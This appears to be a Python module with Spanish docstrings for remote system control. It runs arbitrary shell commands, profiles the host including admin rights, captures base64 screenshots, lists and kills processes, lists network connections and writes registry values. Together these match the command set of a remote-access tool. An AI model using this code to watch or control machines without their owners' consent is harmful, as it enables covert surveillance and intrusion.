"""
Módulo de comandos básicos del sistema.
Este módulo proporciona funciones fundamentales para interactuar con el sistema operativo,
incluyendo ejecución de comandos, obtención de información del sistema, capturas de pantalla,
y gestión de procesos.
"""

import subprocess
import os
import sys
import ctypes
import platform
import psutil
import winreg
import requests
import base64
from PIL import ImageGrab
import io

def execute_system_command(command, shell=True):
    """
    Ejecuta un comando del sistema y captura su salida.
    
    Args:
        command (str): El comando a ejecutar
        shell (bool): Si se debe usar shell para ejecutar el comando
    
    Returns:
        dict: Diccionario con el resultado de la ejecución
            - success (bool): Si el comando se ejecutó correctamente
            - output (str): La salida del comando
            - error (str): Mensaje de error si ocurrió alguno
    """
    try:
        result = subprocess.run(command, shell=shell, capture_output=True, text=True)
        return {
            'success': result.returncode == 0,
            'output': result.stdout,
            'error': result.stderr
        }
    except Exception as e:
        return {
            'success': False,
            'output': '',
            'error': str(e)
        }

def get_system_info():
    """
    Recopila información detallada del sistema operativo y hardware.
    
    Obtiene:
        - Sistema operativo y versión
        - Arquitectura del procesador
        - Nombre del host
        - Información del procesador
        - Memoria RAM total
        - Usuario actual
        - Privilegios de administrador
    
    Returns:
        dict: Información del sistema con todos los detalles recopilados
    """
    try:
        info = {
            'platform': platform.system(),
            'platform_release': platform.release(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'hostname': platform.node(),
            'processor': platform.processor(),
            'ram': f"{psutil.virtual_memory().total / (1024.0 ** 3):.2f} GB",
            'username': os.getlogin(),
            'is_admin': ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0
        }
        return {'success': True, 'info': info}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def capture_screenshot():
    """
    Captura la pantalla y la devuelve en base64.
    
    Returns:
        dict: Diccionario con el resultado de la captura
            - success (bool): Si la captura fue exitosa
            - image (str): Imagen en base64
            - error (str): Mensaje de error si ocurrió alguno
    """
    try:
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr = img_byte_arr.getvalue()
        return {
            'success': True,
            'image': base64.b64encode(img_byte_arr).decode()
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

def list_processes():
    """
    Lista todos los procesos en ejecución.
    
    Returns:
        dict: Diccionario con el resultado de la lista de procesos
            - success (bool): Si la operación fue exitosa
            - processes (list): Lista de procesos con detalles
            - error (str): Mensaje de error si ocurrió alguno
    """
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent']):
            processes.append(proc.info)
        return {'success': True, 'processes': processes}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def kill_process(pid):
    """
    Mata un proceso por su PID.
    
    Args:
        pid (int): ID del proceso a matar
    
    Returns:
        dict: Diccionario con el resultado de la operación
            - success (bool): Si el proceso fue terminado
            - error (str): Mensaje de error si ocurrió alguno
    """
    try:
        psutil.Process(pid).terminate()
        return {'success': True}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def list_network_connections():
    """
    Lista todas las conexiones de red activas.
    
    Returns:
        dict: Diccionario con el resultado de la lista de conexiones
            - success (bool): Si la operación fue exitosa
            - connections (list): Lista de conexiones con detalles
            - error (str): Mensaje de error si ocurrió alguno
    """
    try:
        connections = []
        for conn in psutil.net_connections():
            connections.append({
                'local_addr': conn.laddr,
                'remote_addr': conn.raddr,
                'status': conn.status,
                'pid': conn.pid
            })
        return {'success': True, 'connections': connections}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def modify_registry(key_path, value_name, value_data, value_type='REG_SZ'):
    """
    Modifica el registro de Windows.
    
    Args:
        key_path (str): Ruta de la clave del registro
        value_name (str): Nombre del valor a modificar
        value_data (str/int): Datos del valor a modificar
        value_type (str): Tipo de valor del registro (por defecto 'REG_SZ')
    
    Returns:
        dict: Diccionario con el resultado de la operación
            - success (bool): Si la operación fue exitosa
            - error (str): Mensaje de error si ocurrió alguno
    """
    try:
        reg_types = {
            'REG_SZ': winreg.REG_SZ,
            'REG_DWORD': winreg.REG_DWORD
        }
        
        root = winreg.HKEY_CURRENT_USER
        key = winreg.CreateKey(root, key_path)
        winreg.SetValueEx(key, value_name, 0, reg_types[value_type], value_data)
        winreg.CloseKey(key)
        return {'success': True}
    except Exception as e:
        return {'success': False, 'error': str(e)}
